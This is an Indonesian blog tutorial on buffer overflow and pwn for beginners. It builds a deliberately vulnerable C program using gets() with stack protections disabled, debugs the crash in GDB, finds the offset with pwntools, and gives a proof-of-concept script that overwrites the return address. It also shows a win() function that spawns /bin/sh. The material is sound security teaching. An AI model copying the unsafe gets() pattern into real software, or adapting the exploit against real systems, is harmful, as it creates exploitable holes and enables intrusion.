---
title: Belajar Buffer Overflow Biar Ngerti Dunia PWN - Exploit Development
date: 2025-08-11
thumb: /images/cuteheker.jpeg
tags: ["Pwn"]
---


![PWN THUMB](https://i.ibb.co.com/hRyZnWQm/images-3.jpg)


## 🔥 Pendahuluan

PWN adalah salah satu bidang dalam keamanan siber yang fokus pada eksploitasi binary. Tutorial ini akan memandu kalian dari **nol** sampai bisa membuat **proof-of-concept buffer overflow** dengan penjelasan mendetail untuk pemula.

---

## 🛠 1. Persiapan Lab Environment

![PWN Header](https://i.ibb.co.com/NgtWGDdw/images-2.jpg)

### A. Sistem Operasi dan Tools Dasar

Kita akan menggunakan **Linux** (Debian/Ubuntu) atau WSL di Windows. Berikut perintah instalasi tools dasar:

```bash
sudo apt update
sudo apt install -y build-essential python3 python3-pip gdb gdb-multiarch
```

**Penjelasan Tools:**
- `build-essential`: Untuk kompilasi program C (termasuk GCC)
- `gdb`: Debugger untuk analisis binary
- `gdb-multiarch`: Debugger yang support multi-architecture

### B. Install Pwntools

Pwntools adalah framework Python untuk eksploitasi binary:

```bash
pip3 install pwntools
```

**Fitur Penting Pwntools:**
- Membuat payload secara dinamis
- Berinteraksi dengan proses/program
- Analisis core dump
- Bekerja dengan berbagai architecture

### C. Matikan Proteksi Keamanan (Untuk Pembelajaran)

Di dunia nyata, binary memiliki berbagai proteksi. Untuk belajar, kita matikan dulu:

- **Stack Canary**: Deteksi buffer overflow
- **PIE (Position Independent Executable)**: Alamat memory yang random
- **NX (No-Execute)**: Mencegah eksekusi code di stack

---

## 📜 2. Membuat Program Vulnerable

Buat file `vuln.c` dengan kode berikut:

```c
#include <stdio.h>

void vuln() {
    char buf[10]; // Buffer hanya 10 byte
    printf("Input: ");
    gets(buf); // Fungsi berbahaya! Tidak ada batasan input
    printf("You entered: %s\n", buf);
}

int main() {
    vuln();
    return 0;
}
```

### Kompilasi Program

```bash
gcc vuln.c -o vuln -fno-stack-protector -no-pie -g
```

**Flag Kompilasi:**
- `-fno-stack-protector`: Matikan stack canary
- `-no-pie`: Buat alamat fungsi tetap (tidak random)
- `-g`: Tambahkan simbol debug untuk GDB

---

## 🔍 3. Analisis Binary dengan Checksec

Cek proteksi binary menggunakan `checksec`:

```bash
checksec --file=./vuln
```

**Output Contoh:**
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

**Interpretasi:**
- **No canary**: Bisa overflow stack tanpa deteksi
- **No PIE**: Alamat fungsi predictable
- **NX enabled**: Stack tidak bisa dieksekusi (butuh ROP nanti)

---

## 🧠 4. Debugging dengan GDB

### Langkah Dasar GDB

```bash
gdb ./vuln
```

**Perintah GDB Penting:**
```gdb
(gdb) break vuln       # Set breakpoint di fungsi vuln
(gdb) run             # Jalankan program
(gdb) info registers  # Lihat nilai register
(gdb) x/20wx $rsp     # Lihat 20 word di stack pointer
```

### Eksperimen Crash

1. Jalankan program di GDB
2. Ketika diminta input, masukkan `AAAAAAAAAAAAAAAAAAAA` (20 karakter 'A')
3. Program akan crash dengan error `Segmentation fault`

**Analisis:**
- Register `RIP` akan berisi `0x414141414141` ('AAAA' dalam hex)
- Artinya kita berhasil menimpa return address!

---

## 🧮 5. Mencari Offset dengan Pwntools

Kita perlu tahu **berapa byte** sampai mencapai return address. Gunakan script berikut:

```python
from pwn import *

p = process("./vuln")
payload = cyclic(50)  # Generate pattern unik
p.sendline(payload)
p.wait()

core = p.corefile
rip_value = core.rip
offset = cyclic_find(rip_value)
print(f"Offset ke return address: {offset}")
```

**Contoh Output:**
```
Offset ke return address: 18
```

**Penjelasan:**
- `cyclic(50)` membuat pattern seperti `aaaabaaacaaadaaa...`
- Ketika program crash, kita cari bagian pattern yang mengisi RIP
- `cyclic_find` menghitung berapa byte sampai ke titik itu

---

## 🚀 6. Membuat Proof-of-Concept Exploit

Setelah tahu offset, kita bisa kontrol RIP. Contoh script exploit:

```python
from pwn import *

binary = "./vuln"
p = process(binary)

offset = 18
payload = b"A"*offset + p64(0xdeadbeef)  # Isi RIP dengan 0xdeadbeef

p.sendline(payload)
p.interactive()
```

**Hasil yang Diharapkan:**
```
$ python3 exploit.py
[+] Starting local process './vuln': pid 1234
[*] Switching to interactive mode
Input: You entered: AAAAAAAAAAAAAAAAAA�
[*] Got EOF while reading in interactive
[!] Process './vuln' crashed with signal SIGSEGV
```

Cek di GDB, register RIP sekarang bernilai `0xdeadbeef`!

---

## 📈 7. Roadmap Belajar PWN Fundamental

Berikut alur belajar yang saya rekomendasikan:

1. **Memory Layout**:
   - Stack, heap, data segment
   - Cara program menggunakan memory

2. **Buffer Overflow Dasar**:
   - Seperti yang kita lakukan di tutorial ini
   - Memahami konsep stack frame

3. **Redirection Control Flow**:
   - Arahkan return address ke fungsi `win()` dalam binary
   - Contoh: `payload = b"A"*offset + p64(0x401152)`

4. **Return-Oriented Programming (ROP)**:
   - Bypass NX dengan ROP chain
   - Gabungkan gadget-gadget yang ada

5. **Format String Exploit**:
   - Baca/tulis arbitrary memory
   - Eksploitasi bug `printf`

---

## 🔜 Tantangan Selanjutnya

Mau lanjut ke level lebih advanced? Coba ini:

1. Tambahkan fungsi `win()` yang print flag
2. Eksploitasi untuk redirect eksekusi ke `win()`
3. Bypass NX dengan ROP untuk spawn shell

```c
void win() {
    system("/bin/sh");
}
```

Bersiaplah untuk tutorial part 2 dimana kita akan membahas:
- Membuat shellcode custom
- Teknik Return-Oriented Programming (ROP)
- Bypass mitigasi modern

---

## 📚 Referensi Tambahan

- [LiveOverflow Binary Hacking Playlist](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
- [CTF 101: Binary Exploitation](https://ctf101.org/binary-exploitation/overview/)
- [pwntools Documentation](https://docs.pwntools.com/en/stable/)

``` 

Tips untuk pembaca:
1. Coba setiap step sendiri di virtual machine
2. Ubah-ubah nilai dan lihat efeknya
3. Gunakan GDB untuk inspect memory setelah crash
4. Dokumentasikan setiap progress belajar kalian!
